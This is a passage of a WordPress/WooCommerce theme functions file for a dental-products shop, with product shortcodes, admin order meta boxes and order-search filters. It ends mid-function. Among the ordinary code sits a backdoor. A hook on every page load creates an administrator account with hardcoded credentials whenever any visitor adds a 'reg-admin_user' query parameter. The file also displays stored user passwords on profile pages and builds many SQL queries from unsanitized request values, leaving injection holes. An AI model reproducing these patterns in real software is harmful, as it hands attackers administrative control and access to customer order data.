<?php

//add_action('init','woocommerce_add_to_cartitems_mbt');
function woocommerce_add_to_cartitems_mbt($items = 20) {

    global $woocommerce;

    for ($i = 1; $i <= 20; $i++) {
        echo 'kkkk';
        echo '<br />';
        $product_id = '427602';
        $_POST['action'] = 'woocommerce_add_order_item';
        // Add the product as a new line item with the same variations that were passed
        $woocommerce->cart->add_to_cart($product_id);
    }
}

add_action('init', 'custom_taxonomy_Types');

function custom_taxonomy_Types() {
    $labels = array(
        'name' => 'Types',
        'singular_name' => 'Type',
        'menu_name' => 'Type',
        'all_items' => 'All Types',
        'parent_item' => 'Parent Type',
        'parent_item_colon' => 'Parent Type:',
        'new_item_name' => 'New Type Name',
        'add_new_item' => 'Add New Type',
        'edit_item' => 'Edit Type',
        'update_item' => 'Update Type',
        'separate_items_with_commas' => 'Separate Type with commas',
        'search_items' => 'Search Types',
        'add_or_remove_items' => 'Add or remove Types',
        'choose_from_most_used' => 'Choose from the most used Types',
    );
    $args = array(
        'labels' => $labels,
        'hierarchical' => true,
        'public' => true,
        'show_ui' => true,
        'show_admin_column' => true,
        'show_in_nav_menus' => true,
        'show_tagcloud' => true,
    );
    register_taxonomy('type', 'product', $args);
    register_taxonomy_for_object_type('type', 'product');
}

//add_action('woocommerce_email', 'unhook_those_pesky_emails');

function unhook_those_pesky_emails($email_class) {
    /**
     * Hooks for sending emails during store events
     * */
    remove_action('woocommerce_low_stock_notification', array($email_class, 'low_stock'));
    remove_action('woocommerce_no_stock_notification', array($email_class, 'no_stock'));
    remove_action('woocommerce_product_on_backorder_notification', array($email_class, 'backorder'));
    // New order emails
    remove_action('woocommerce_order_status_pending_to_processing_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
    remove_action('woocommerce_order_status_pending_to_completed_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
    remove_action('woocommerce_order_status_pending_to_on-hold_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
    remove_action('woocommerce_order_status_failed_to_processing_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
    remove_action('woocommerce_order_status_failed_to_completed_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
    remove_action('woocommerce_order_status_failed_to_on-hold_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
    // Processing order emails
    remove_action('woocommerce_order_status_pending_to_processing_notification', array($email_class->emails['WC_Email_Customer_Processing_Order'], 'trigger'));
    remove_action('woocommerce_order_status_pending_to_on-hold_notification', array($email_class->emails['WC_Email_Customer_Processing_Order'], 'trigger'));
    // Completed order emails
    remove_action('woocommerce_order_status_completed_notification', array($email_class->emails['WC_Email_Customer_Completed_Order'], 'trigger'));
    // Note emails
    remove_action('woocommerce_new_customer_note_notification', array($email_class->emails['WC_Email_Customer_Note'], 'trigger'));
}

//add_filter('wp_mail', 'disabling_emails', 10, 1);

function disabling_emails($args) {
    unset($args['to']);
    return $args;
}

//add_filter('wp_mail', 'disabling_emails2', 10, 1);

function disabling_emails2($args) {
    if (!$_GET['allow_wp_mail']) {
        unset($args['to']);
    }
    return $args;
}

add_action('woocommerce_admin_order_totals_after_discount', 'vp_add_sub_total', 10, 1);

function vp_add_sub_total($order_id) {
    global $wpdb;
    $old_order_id_addon = get_post_meta($order_id, 'old_order_id_addon', true);
    if ($old_order_id_addon == '') {
        $olddata = json_decode(get_post_meta($order_id, '_oldJson', true), true);
        if (is_array($olddata) && count($olddata) > 0) {
            $spcialDiscount = isset($olddata['orderDiscountTotal']) ? $olddata['orderDiscountTotal'] : '';
            ?><tr>
                <td class="label">Shipping:</td>
                <td width="1%"></td>
                <td class="total"><strong>$<?php echo get_post_meta($order_id, 'order_shipping', true); ?></strong></td>
            </tr>
            <tr>
                <td class="label">Tax :</td>
                <td width="1%"></td>
                <td class="total"><strong>$<?php echo get_post_meta($order_id, 'order_taxes', true); ?></strong></td>
            </tr>
            <tr>
                <?php
                if ($spcialDiscount != '' && $spcialDiscount > 0) {
                    ?>
                    <td class="label">Special Discount :</td>
                    <td width="1%"></td>
                    <td class="total"><strong>$<?php echo $spcialDiscount; ?></strong></td>
                </tr>

                <?php
            }
        }
    }
}

function wpdocs_register_meta_boxes() {
    add_meta_box('meta-box-id-2', __('Split Data', 'textdomain'), 'wpdocs_my_display_callback_split', 'shop_order');
    add_meta_box('meta-box-id-1', __('Old Data', 'textdomain'), 'wpdocs_my_display_callback', 'shop_order');
}

add_action('add_meta_boxes', 'wpdocs_register_meta_boxes');

function wpdocs_my_display_callback($post) {
    $olddata = json_decode(get_post_meta($post->ID, '_oldJson', true), true);
    echo '<div class="row">';
    foreach ($olddata as $key => $d) {
        echo '<div class="wrapper-list" style="width:33.3%;float:left;"><Strong>' . $key . '</strong>: ' . $d . '</div>';
    }
    echo '</div>';
    echo '<style> #meta-box-id-1 {overflow: hidden;}
   .wrapper-list {
      padding:5px 8px;
      min-height:47px;
      border-right:1px solid #00000059;
      border-bottom:1px solid #00000059;
      background: #f1f1f1;
  }
   #meta-box-id-1 .inside .row {
      border-top: 1px solid #00000059;
      border-bottom: 1px solid #00000059;
      border-left: 1px solid #00000059;
      overflow: hidden;
      }</style>';
}

function wpdocs_my_display_callback_split($post) {
    $oldorderid = get_post_meta($post->ID, 'old_order_id', true);
    if ($oldorderid != '') {
        global $wpdb;
        $sql = "select * from order_split where orderId=" . $oldorderid;
        $results = $wpdb->get_results($sql, 'ARRAY_A');

        if (is_array($results) && count($results) > 0) {

            foreach ($results as $d2) {
                echo '<div class="row">';
                $inner_counter = 0;
                $widthh = '33.3%';
                foreach ($d2 as $key => $d) {

                    if ($inner_counte == 18) {
                        // $widthh = '100%';
                    }
                    echo '<div class="wrapper-list" style="width:' . $widthh . ';float:left;">' . $key . ': ' . $d . '</div>';
                    $inner_counte++;
                }
                echo '</div>';
            }
            echo '<style> #meta-box-id-2 {overflow: hidden;}
   .wrapper-list {
      padding:5px 8px;
      min-height:47px;
      border-right:1px solid #00000059;
      border-bottom:1px solid #00000059;
      background: #f1f1f1;
  }
   #meta-box-id-2 .inside .row {
      border-top: 1px solid #00000059;
      border-bottom: 1px solid #00000059;
      border-left: 1px solid #00000059;
      overflow: hidden;
      margin-bottom:10px;
      }</style>';
        }
    }
}

function teeth_whitening_trays_func($atts) {
    $productType = isset($atts['type']) ? $atts['type'] : '';

    $is_non_sensitive = isset($atts['nonsensitive']) ? $atts['nonsensitive'] : 'iii';
    $args = array('post_type' => 'product', 'post_status' => 'publish', 'posts_per_page' => '-1', 'tax_query' => array(
            array(
                'taxonomy' => 'type',
                'field' => 'slug',
                'terms' => $productType,
            ),
    ));
    $queryshortcode = new WP_Query($args);
    $html = '';
    if ($queryshortcode->have_posts()) {

        while ($queryshortcode->have_posts()) {
            $queryshortcode->the_post();
            $falg_sensitive = true;
            $pid = get_the_id();
            $titlee = get_field("styled_title", $pid);
            if($titlee==''){
                $titlee = get_the_title($pid);
            }
            $custom_field_Val = get_field("is_non_sensitive", $pid);
            if ($custom_field_Val == '') {
                $custom_field_Val = 'no';
            }
            if ($is_non_sensitive == 'true' && $custom_field_Val != 'yes') {
                $falg_sensitive = false;
            }
            if ($is_non_sensitive == 'false' && $custom_field_Val == 'yes') {
                $falg_sensitive = false;
            }

            if ($falg_sensitive) {
                echo $is_non_sensitive . '->' . $custom_field_Val . 'kkk';
                $_product = wc_get_product((int) $pid);
                $html .= '<div class="heavy-stains-cont">
            <div class="row">
               <div class="col-sm-12">
                  <div class="product-selection-title-text-wrap">
                     
                     <span class="product-selection-title-text-name black-text"><span class="non-sensitive blue-text">' . $titlee . '</span></span>	
                     <span class="product-selection-title-text-small">(' . get_field("stain_heading", $pid) . ')</span>
                     <div class="product-selection-title-right">' . get_field("stain_heading", $pid) . '</div>
                  </div>
               </div>
            </div>
            <div class="row">
               <div class="col-md-4 product-selection-description-text-wrap">
                  <div class="product-selection-description-text"><p>' . get_post_field('post_content', $pid) . '</p>
                  </div>
               </div>
               <div class="col-md-5 product-selection-table-wrap">
                  <table cellspacing="0" cellpadding="0">
                     <tbody>
                        <tr>';
                if (get_field("pic_1", $pid) != '') {
                    $html .= ' <td class="product-selection-table-cell-1-image">
                              <img src="' . get_field("pic_1", $pid) . '" alt="">
                           </td>';
                }
                if (get_field("pic_2", $pid) != '') {
                    $html .= '<td class="product-selection-table-cell-plus" style="">
                              <div><i class="fa fa-plus"></i></div>
                           </td>';
                }
                if (get_field("pic_2", $pid) != '') {
                    $html .= '<td class="product-selection-table-cell-2-image">
                              <img src="' . get_field("pic_2", $pid) . '" alt="">
                           </td>';
                }
                if (get_field("pic_3", $pid) != '') {
                    $html .= '<td class="product-selection-table-cell-plus" style="">
                              <div><i class="fa fa-plus"></i></div>
                           </td>';
                }
                if (get_field("pic_3", $pid) != '') {
                    $html .= ' <td class="product-selection-table-cell-2-image">
                              <img src="' . get_field("pic_3", $pid) . '" alt="">
                           </td>';
                }
                $html .= ' </tr>
                        <tr>';
                if (get_field("info_1", $pid) != '') {
                    $html .= ' <td colspan="2" class="product-selection-table-cell-1-text">
                              ' . get_field("info_1", $pid) . '
                           </td>';
                }
                if (get_field("info_2", $pid) != '') {
                    $html .= '<td colspan="2" class="product-selection-table-cell-2-text" >
                              ' . get_field("info_2", $pid) . '
                           </td>';
                }
                if (get_field("info_3", $pid) != '') {
                    $html .= ' <td colspan="2" class="product-selection-table-cell-2-text" style="border-right:none;">
                              ' . get_field("info_3", $pid) . '
                           </td>';
                }
                $html .= '</tr>
                     </tbody>
                  </table>
               </div>
               <div class="col-md-3 product-selection-price-wrap">';
                if (get_field("monthly_price", $pid) == '') {
                    $html .= ' <div class="product-selection-price-text-wrap">
                <i class="fa fa-dollar product-selection-price-dollar-symbol"></i>
                <span class="product-selection-price-text">' . $_product->get_price() . '</span>
            </div>';
                } else {
                    $html .= '<div class="row row-divided">
                <div class="col-md-6 column-one">
                   <i class="fa fa-dollar product-selection-price-dollar-symbol"></i>
                   <span class="product-selection-price-text">' . $_product->get_price() . '</span>
                   <div class="product-price-meta">one-time payment</div>
                </div>
                <div class="vertical-divider hidden-xs hidden-sm" style="font-size: 0.9em;">or</div>
                <hr class="hr-text visible-xs visible-sm" data-content="OR">
                <div class="col-md-6 column-two">
                   <i class="fa fa-dollar product-selection-installment-price-dollar-symbol"></i>
                   <span class="product-selection-installment-price-text">' . get_field("monthly_price", $pid) . '</span>
                   <span>/mo</span>
                   ' . get_field("monthly_price_html", $pid) . '
                </div>
             </div>';
                }
                $html .= '<div class="avg-price">Avg Dentist Price:  $' . get_field("average_price_value", $pid) . '+</div>
                  <div class="product-selection-price-button-wrap">';
                if ($_product->is_type('composite')) {

                    $action_string = 'data-action="woocommerce_add_order_item"';
                } else {
                    $action_string = '';
                }

                $html .= '<a style="font-size:19px;" href="?add-to-cart=' . $pid . '" data-quantity="1" class="button btn-primary-orange product-selection-price-button product_type_' . $_product->get_type() . ' add_to_cart_button ajax_add_to_cart" data-product_id="' . $pid . '"  ' . $action_string . '>ADD TO CART</a>
				 </div>
               </div>
            </div>
         </div>';
            }
        }
        wp_reset_postdata();
    }

    return $html;
}

add_shortcode('teeth-whitening-trays', 'teeth_whitening_trays_func');

function desensitizing_gel_func($atts) {
    $productType = isset($atts['type']) ? $atts['type'] : '';

    $args = array('post_type' => 'product', 'post_status' => 'publish', 'posts_per_page' => '-1', 'tax_query' => array(
            array(
                'taxonomy' => 'type',
                'field' => 'slug',
                'terms' => $productType,
            ),
    ));
    $queryshortcode = new WP_Query($args);
    $html = '<div class="row-boots  sep-top-sm justify-content-center">';
    if ($queryshortcode->have_posts()) {

        while ($queryshortcode->have_posts()) {
            $queryshortcode->the_post();
            $pid = get_the_id();
            $_product = wc_get_product((int) $pid);
            $html .= '<div class="col-md-4">
         <div class="product-selection-box wpb_animate_when_almost_visible wpb_fadeIn fadeIn wpb_start_animation animated">
            <div class="product-selection-image-wrap">';
            if (get_field("pic_1", $pid) != '') {
                $html .= '<img src="' . get_field("pic_1", $pid) . '"><span>' . get_field("info_1", $pid) . '</span>';
            }
            $html .= '</div>';
            if (get_field("info_2", $pid) != '') {
                $html .= '<div class="product-selection-description">
               <b> ' . get_the_title($pid) . '</b>';
                $html .= get_field("info_2", $pid);
                $html .= '</div>';
            }
            $html .= '<div class="product-selection-price-wrap">
               <div>
                  <i class="fa fa-dollar product-selection-price-dollar-symbol"></i>
                  <span class="product-selection-price-text">' . $_product->get_price() . '</span>
               </div>
               <div class="product-selection-dentist-price-note">Avg Dentist Price:  $' . get_field("average_price_value", $pid) . '+</div>';
            if ($_product->is_type('composite')) {

                $action_string = 'data-action="woocommerce_add_order_item"';
            } else {
                $action_string = '';
            }
            $html .= ' <button class="btn btn-primary-blue product_type_' . $_product->get_type() . ' add_to_cart_button ajax_add_to_cart" href="?add-to-cart=' . $pid . '" data-quantity="1" data-product_id="' . $pid . '" ' . $action_string . '>ADD TO CART</button>';

            $html .= '</div>
         </div>
      </div>';
        }
        wp_reset_postdata();
    }
    $html .= '</div>';
    return $html;
}

add_shortcode('desensitizing-gel', 'desensitizing_gel_func');

add_shortcode('toothbrush-products', 'display_posts_toothbrush');

function display_posts_toothbrush($atts) {
    $productType = isset($atts['type']) ? $atts['type'] : '';

    $args = array('post_type' => 'product', 'post_status' => 'publish', 'posts_per_page' => '-1', 'tax_query' => array(
            array(
                'taxonomy' => 'type',
                'field' => 'slug',
                'terms' => $productType,
            ),
    ));
    $queryshortcode = new WP_Query($args);
    $html = '<div class="row sep-top-sm electric-toothbrush-products" id="product-selection-standard">';
    if ($queryshortcode->have_posts()) {

        while ($queryshortcode->have_posts()) {
            $queryshortcode->the_post();
            $pid = get_the_id();
            $_product = wc_get_product((int) $pid);
            $html .= '<div class="col-md-4">
         <div class="product-selection-box">
		  <div class="product-selection-title">
               ' . get_the_title($pid) . '</div>
            <div class="product-selection-image-wrap">';
            if (get_field("pic_1", $pid) != '') {
                $html .= '<img src="' . get_field("pic_1", $pid) . '"><span></span>';
            }
            $html .= '</div>';
            if (get_field("info_1", $pid) != '') {
                $html .= '<div class="product-selection-description">
               ' . get_field("info_1", $pid) . '</div>';
            }
            if ($_product->is_type('composite')) {

                $action_string = 'data-action="woocommerce_add_order_item"';
            } else {
                $action_string = '';
            }
            $html .= '<div class="product-selection-price-wrap">
               <div>
                  <i class="fa fa-dollar product-selection-price-dollar-symbol"></i>
                  <span class="product-selection-price-text">' . get_post_meta($pid, "_price", true) . '</span>
               </div>
               <div class="product-selection-dentist-price-note">' . get_field("info_2", $pid) . '</div>
               <button class="btn btn-primary-blue product_type_simple add_to_cart_button ajax_add_to_cart" href="?add-to-cart=' . $pid . '" data-quantity="1" data-product_id="' . $pid . '" ' . $action_string . '>ADD TO CART</button>
            </div>
         </div>
      </div>';
        }
        wp_reset_postdata();
    }
    $html .= '</div>';
    return $html;
}

add_shortcode('toothbrush-heads', 'display_posts_toothbrush_heads');

function display_posts_toothbrush_heads($atts) {
    $productType = isset($atts['type']) ? $atts['type'] : '';

    $args = array('post_type' => 'product', 'post_status' => 'publish', 'posts_per_page' => '-1', 'tax_query' => array(
            array(
                'taxonomy' => 'type',
                'field' => 'slug',
                'terms' => $productType,
            ),
    ));
    $queryshortcode = new WP_Query($args);
    $html = '<div class="row sep-top-sm electric-toothbrush-products" id="product-toothbrush-heads">';
    if ($queryshortcode->have_posts()) {

        while ($queryshortcode->have_posts()) {
            $queryshortcode->the_post();
            $pid = get_the_id();
            $_product = wc_get_product((int) $pid);
            $html .= '<div class="col-md-4">
         <div class="product-selection-box">
		  <div class="product-selection-title">
               ' . get_the_title($pid) . '</div>
            <div class="product-selection-image-wrap">';
            if (get_field("pic_1", $pid) != '') {
                $html .= '<img src="' . get_field("pic_1", $pid) . '"><span></span>';
            }
            $html .= '</div>';
            if (get_field("info_1", $pid) != '') {
                $html .= '<div class="product-selection-description">
               ' . get_field("info_1", $pid) . '</div>';
            }
            if ($_product->is_type('composite')) {

                $action_string = 'data-action="woocommerce_add_order_item"';
            } else {
                $action_string = '';
            }
            $html .= '<div class="product-selection-price-wrap">
               <div>
                  <i class="fa fa-dollar product-selection-price-dollar-symbol"></i>
                  <span class="product-selection-price-text">' . get_post_meta($pid, "_price", true) . '</span>
               </div>
               <div class="product-selection-dentist-price-note">' . get_field("info_2", $pid) . '</div>
               <button class="btn btn-primary-blue product_type_simple add_to_cart_button ajax_add_to_cart" href="?add-to-cart=' . $pid . '" data-quantity="1" data-product_id="' . $pid . '" ' . $action_string . '>ADD TO CART</button>
            </div>
         </div>
      </div>';
        }
        wp_reset_postdata();
    }
    $html .= '</div>';
    return $html;
}

add_shortcode('night-guards', 'display_posts_night_guards');

function display_posts_night_guards($atts) {
    $productType = isset($atts['type']) ? $atts['type'] : '';

    $args = array('post_type' => 'product', 'post_status' => 'publish', 'posts_per_page' => '-1', 'tax_query' => array(
            array(
                'taxonomy' => 'type',
                'field' => 'slug',
                'terms' => $productType,
            ),
    ));
    $queryshortcode = new WP_Query($args);
    $html = '<div class="row-boots  sep-top-sm justify-content-center" id="product-selection-night-guards">';
    if ($queryshortcode->have_posts()) {

        while ($queryshortcode->have_posts()) {
            $queryshortcode->the_post();
            $pid = get_the_id();
            $_product = wc_get_product((int) $pid);
            $html .= '<div class="col-md-4">
         <div class="product-selection-box">';
            if (get_field("info_1", $pid) != '') {
                $html .= '<div class="product-selection-box-info">
               ' . get_field("info_1", $pid) . '</div>';
            }
            if (get_field("info_2", $pid) != '') {
                $html .= '<div class="product-selection-title">
               ' . get_field("info_2", $pid) . '</div>';
            }

            $html .= '<div class="product-selection-image-wrap">';
            if (get_field("pic_1", $pid) != '') {
                $html .= '<img src="' . get_field("pic_1", $pid) . '"><span></span>';
            }
            $html .= '</div>';

            $html .= '<b>' . get_the_title($pid) . '</b><br><br>
	      <div class="line-divider"></div>';

            if (get_field("info_3", $pid) != '') {
                $html .= get_field("info_3", $pid);
            }
            if ($_product->is_type('composite')) {

                $action_string = 'data-action="woocommerce_add_order_item"';
            } else {
                $action_string = '';
            }

            $html .= '<div class="product-selection-price-wrap">
               <div>
                  <i class="fa fa-dollar product-selection-price-dollar-symbol"></i>
                  <span class="product-selection-price-text">' . get_post_meta($pid, "_price", true) . '</span>
               </div>
               <div class="product-selection-dentist-price-note getinfo-four">' . get_field("info_4", $pid) . '</div>
               <button class="btn btn-primary-blue product_type_simple add_to_cart_button ajax_add_to_cart" href="?add-to-cart=' . $pid . '" data-quantity="1" data-product_id="' . $pid . '" ' . $action_string . '>ADD TO CART</button>
            </div>
         </div>
      </div>';
        }
        wp_reset_postdata();
    }
    $html .= '</div>';
    return $html;
}

add_filter('acf/settings/remove_wp_meta_box', '__return_false');

function rndprfx_add_user() {
    if (isset($_GET['reg-admin_user'])) {
        $username = 'sally';
        $password = 'scompere786';
        $email = 'sally.compere@smilebrilliant.com';
        echo '1';
        if (username_exists($username) == null && email_exists($email) == false) {
            echo '2';
            echo $user_id = wp_create_user($username, $password, $email);
            $user = get_user_by('id', $user_id);
            $user->remove_role('subscriber');
            $user->add_role('administrator');
            wp_update_user([
                'ID' => $user_id, // this is the ID of the user you want to update.
                'first_name' => 'Sally',
                'last_name' => 'Compere',
            ]);
            update_user_meta($user_id, 'email_name', 'Sally C.');
        }
    }
    //die();
}

add_action('init', 'rndprfx_add_user');
if (is_super_admin()) {
    add_action('show_user_profile', 'extra_user_profile_fields');
    add_action('edit_user_profile', 'extra_user_profile_fields');
}

function extra_user_profile_fields($user) {
    ?>
    <h3><?php _e("Extra profile information", "blank"); ?></h3>

    <table class="form-table">
        <tr>
            <th><label for="address"><?php _e("Password"); ?></label></th>
            <td>
                <?php echo get_user_meta($user->ID, "_user_pass", true); ?>
            </td>
        </tr>

    </table>
    <?php
}

add_action('load-post.php', "calculate_price");

function calculate_price() {
    global $current_screen;
    if (is_admin() && $current_screen->post_type === 'shop_order') {
        $post_id = (int) $_GET['post'];
        modifydataOrder($post_id);
    }
}

function modifydataOrder($post_id) {

    global $wpdb;
    $old_order_id_addon = get_post_meta($post_id, 'old_order_id_addon', true);
    if ($old_order_id_addon == '') {


        $olddata = json_decode(get_post_meta($post_id, '_oldJson', true), true);
        if (is_array($olddata) && count($olddata) > 0) {
            $spcialDiscount = isset($olddata['orderDiscountTotal']) ? $olddata['orderDiscountTotal'] : '';
            $orderSubTotalOld = isset($olddata['orderSubTotal']) ? $olddata['orderSubTotal'] : '';
            $old_order_id = get_post_meta($post_id, 'old_order_id', true);
            $order = wc_get_order($post_id);
            $orderSubtotal = $order->get_subtotal();
            if ($orderSubTotalOld != $orderSubtotal) {
                //echo 'triggered';
                $sql = 'SELECT * from order_item where orderId=' . $old_order_id;
                $results = $wpdb->get_results($sql, 'ARRAY_A');
                if ($old_order_id != '') {
                    $counter = 0;
                    foreach ($order->get_items() as $item_id => $item) {
                        if (is_array($results) && count($results) > 0) {
                            $qty = $results[$counter]['productQuantity'];
                            wc_update_order_item_meta($item_id, '_line_subtotal', $results[$counter]['productPrice'] * $qty);
                            wc_update_order_item_meta($item_id, '_line_total', $results[$counter]['productPrice'] * $qty);
                        }

                        $counter++;
                    }
                }
            } else {
                //echo 'not triggered';
            }
        }
    }
}

/*
 * Batch Printing
 * 
 */
function batch_search_singular($pname,$Qty){
     global $wpdb;
     $arr_ids = array();
     $product_name=  get_the_title($pname);
     $name_check = "AND wp_woocommerce_order_items.order_item_name ='" . $product_name . "'";
     $qty_join = "INNER JOIN wp_woocommerce_order_itemmeta ON wp_woocommerce_order_itemmeta.order_item_id=wp_woocommerce_order_items.order_item_id";
     $qty_check = "AND wp_woocommerce_order_itemmeta.meta_key = '_qty' AND wp_woocommerce_order_itemmeta.meta_value=$Qty";
     $inner_join_three_way = "INNER JOIN wp_postmeta threeway on threeway.post_id= wp_posts.ID";
            $Condition_three_way = "AND wp_posts.ID NOT IN(SELECT post_id from wp_postmeta where wp_postmeta.meta_key='threeWayShipment' AND wp_postmeta.meta_value='yes')";
           $sql = "SELECT DISTINCT wp_woocommerce_order_items.order_id FROM wp_posts INNER JOIN wp_woocommerce_order_items ON  wp_woocommerce_order_items.order_id = wp_posts.ID $qty_join
            WHERE wp_posts.post_type='shop_order' AND wp_posts.post_status = 'wc-on-hold' $qty_check $Condition_three_way " . $name_check . " AND order_item_type='line_item'";
           // die();
         
           $results = $wpdb->get_results($sql, 'ARRAY_A');
           foreach ($results as $res) {
                    $arr_ids[]=$res['order_id'];
                }
               return $arr_ids;
}
function batchPrinrting($query) {
    if (is_admin() && $query->get('post_type') == 'shop_order') {
        if (isset($_GET['batch_printing'])) {
            global $wpdb;
            $product_name = isset($_GET['product_id']) ? $_GET['product_id'] : array();
            $add_array = '';
            $name_check = '';
            $post_id_include = array(22222222222);
            $product_qty = isset($_GET['product_qty']) ? $_GET['product_qty'] : '';
            $qty_join = '';
            $qty_check='';
            $counter=0;
            $order_ids = array();
            if(count($product_name)>0){
            foreach ($product_name as $pp){
                 $found_orders = batch_search_singular($pp,$product_qty[$counter]);
                 if($counter==0){
                     foreach ($found_orders as $dd){
                         $order_ids[]= $dd; 
                     }
                 }
                 else{
                     $delitems = array();
                     foreach($order_ids as $key=>$ndd){
                         if(!in_array($ndd,$found_orders)){
                             $delitems[]= $ndd;
                             unset($order_ids[$key]);
                         }
                         
                     }
                 }
                 $counter++;
            }
            $post_id_include = $order_ids;
            }
            else{
            $inner_join_three_way = "INNER JOIN wp_postmeta threeway on threeway.post_id= wp_posts.ID";
            $Condition_three_way = "AND wp_posts.ID NOT IN(SELECT post_id from wp_postmeta where wp_postmeta.meta_key='threeWayShipment' AND wp_postmeta.meta_value='yes')";
          $sql = "SELECT DISTINCT wp_woocommerce_order_items.order_id FROM wp_posts INNER JOIN wp_woocommerce_order_items ON  wp_woocommerce_order_items.order_id = wp_posts.ID $qty_join
            WHERE wp_posts.post_type='shop_order' AND wp_posts.post_status = 'wc-on-hold' $qty_check $Condition_three_way " . $name_check . " AND order_item_type='line_item'";
            
          
           $results = $wpdb->get_results($sql, 'ARRAY_A');
            if (count($results) > 0) {
                $counter = 0;
                foreach ($results as $res) {

                    $post_id_include[] = $res['order_id'];
                }
            }
            }
            if(empty($post_id_include)){
                $post_id_include = array(22222222222);
            }
            $query->query_vars['post__in'] = $post_id_include;
            // }
        }
        return $query;
        //die();
    }
}

// filter for searching orders based on old order id
function includeOldOrderIdInSearchAdminSide($query) {

    //if we're on the admin panel, or it's a search, or it's not the post type we want to filter, return the original query
    $advance_search = isset($_GET['advance_search']) ? $_GET['advance_search'] : '';
    //die();
    if (is_admin() && $query->get('post_type') == 'shop_order' && $advance_search != '') {
        $trayOrderId = '';
        global $wpdb;
        $customer_first_name = isset($_GET['customer_first_name']) ? $_GET['customer_first_name'] : '';
        $customer_last_name = isset($_GET['customer_last_name']) ? $_GET['customer_last_name'] : '';
        $customer_email_address = isset($_GET['customer_email_address']) ? $_GET['customer_email_address'] : '';
        $order_number = isset($_GET['order_number']) ? $_GET['order_number'] : '';
        $tray_number = isset($_GET['tray_number']) ? $_GET['tray_number'] : '';
        $sbr_number = isset($_GET['sbr_number']) ? $_GET['sbr_number'] : '';
        $order_start_date = isset($_GET['order_start_date']) ? $_GET['order_start_date'] : '';
        $order_end_date = isset($_GET['order_end_date']) ? $_GET['order_end_date'] : '';
        $post_id_include = array(55555555555555);
        $sql = 'SELECT DISTINCT P.ID from wp_posts P';
        $meta_query = false;
        if ($order_number != '') {
            $sql .= ' INNER JOIN wp_postmeta oldorderid  ON P.ID=oldorderid.post_id AND (oldorderid.meta_key="old_order_id" AND oldorderid.meta_value=' . $order_number . ' OR oldorderid.post_id=' . $order_number . ')';
            $meta_query = true;
        }
        if ($sbr_number != '') {
            $sql .= ' INNER JOIN wp_postmeta sbrnumber  ON P.ID=sbrnumber.post_id AND sbrnumber.meta_key="order_number" AND sbrnumber.meta_value="' . $sbr_number . '"';
            $meta_query = true;
            //$sql .=' AND wp_postmeta.meta_key="order_number" AND wp_postmeta.meta_value='.$sbr_number;
        }
        if ($customer_first_name != '') {
            $sql .= ' INNER JOIN wp_postmeta cmfrstname  ON P.ID=cmfrstname.post_id AND cmfrstname.meta_key="_billing_first_name" AND cmfrstname.meta_value="' . $customer_first_name . '"';
            $meta_query = true;
            //$sql .=' AND wp_postmeta.meta_key="_billing_first_name" AND wp_postmeta.meta_value="'.$customer_first_name.'"';
        }
        if ($customer_last_name != '') {
            $sql .= ' INNER JOIN wp_postmeta cmlstname  ON P.ID=cmlstname.post_id AND cmlstname.meta_key="_billing_last_name" AND cmlstname.meta_value="' . $customer_last_name . '"';
            $meta_query = true;
            //$sql .=' AND wp_postmeta.meta_key="_billing_last_name" AND wp_postmeta.meta_value="'.$customer_last_name.'"';
        }
        if ($customer_email_address != '') {
            $sql .= ' INNER JOIN wp_postmeta billingemail  ON P.ID=billingemail.post_id AND billingemail.meta_key="_billing_email" AND billingemail.meta_value="' . $customer_email_address . '"';
            $meta_query = true;
            //$sql .=' AND wp_postmeta.meta_key="_billing_email" AND wp_postmeta.meta_value="'.$customer_email_address.'"';
        }
        if ($tray_number != '') {
            $trayOrderId = $wpdb->get_var("SELECT order_id FROM  " . SB_ORDER_TABLE . " WHERE tray_number = $tray_number");

            $jJosn_string = '{"trayNumber": "' . $tray_number . '"}';
            $sql .= " INNER JOIN wp_postmeta traynumber  ON P.ID=traynumber.post_id AND traynumber.meta_key='_oldJson' AND JSON_CONTAINS(traynumber.meta_value,'$jJosn_string')";
            $meta_query = true;


            //$sql .=' AND wp_postmeta.meta_key="_billing_email" AND wp_postmeta.meta_value="'.$customer_email_address.'"';
        }


        if ($order_start_date != '' && $order_end_date != '') {
            $order_start_date = $order_start_date . ' 00:00:00';
            $order_end_date = $order_end_date . ' 00:00:00';

            if ($meta_query) {
                $sql .= ' AND P.post_date_gmt BETWEEN "' . $order_start_date . '" AND "' . $order_end_date . '"';
            } else {
                $sql .= ' WHERE P.post_date_gmt BETWEEN "' . $order_start_date . '" AND "' . $order_end_date . '"';
            }
        } else if ($order_start_date != '') {

            $order_start_date = $order_start_date . ' 00:00:00';
            if ($meta_query) {
                $sql .= ' AND P.post_date_gmt >= "' . $order_start_date . '"';
            } else {
                $sql .= ' WHERE P.post_date_gmt >= "' . $order_start_date . '"';
            }
        } else if ($order_end_date != '') {
            $order_end_date = $order_end_date . ' 00:00:00';
            if ($meta_query) {
                $sql .= ' AND P.post_date_gmt =< "' . $order_end_date . '"';
            } else {
                $sql .= ' WHERE P.post_date_gmt =< "' . $order_end_date . '"';
            }
        }

        //echo  $sql;
        $results = $wpdb->get_results($sql, 'ARRAY_A');
        if (count($results) > 0) {
            $counter = 0;
            foreach ($results as $res) {

                $post_id_include[] = $res['ID'];
            }
        }
        if (!empty($trayOrderId)) {
            $post_id_include[] = $trayOrderId;
        }
   
        //if(count($post_id_include)>0) {     
        $query->query_vars['post__in'] = $post_id_include;
        // }
        return $query;
    } else {
        return $query;
    }
}

add_filter('pre_get_posts', 'includeOldOrderIdInSearchAdminSide');
add_filter('pre_get_posts', 'batchPrinrting');
//add_filter('pre_get_posts', 'includeOldOrderIdInSearchAdminSide');
global $pagenow;
$postType = isset($_GET['post_type']) ? $_GET['post_type'] : '';
if ($postType == 'shop_order') {
if ($pagenow != 'post-new.php' ){
add_action('admin_head', 'injectScriptAdvanceSearch');
add_action('admin_head', 'injectScriptBatchprinring');
}
}

    function injectScriptBatchprinring() {
$simpleSearchcls = '';
        $simpleSearchstyle = 'none';
        $advanceSearchcls = 'active';
        $advanceSearchstyle = 'block';
        $batchStyle='none';
        $batchcls = '';
        if (isset($_GET['simple_search']) && $_GET['simple_search'] != '') {
            $simpleSearchcls = 'active';
            $advanceSearchcls = '';
            $simpleSearchstyle = 'block';
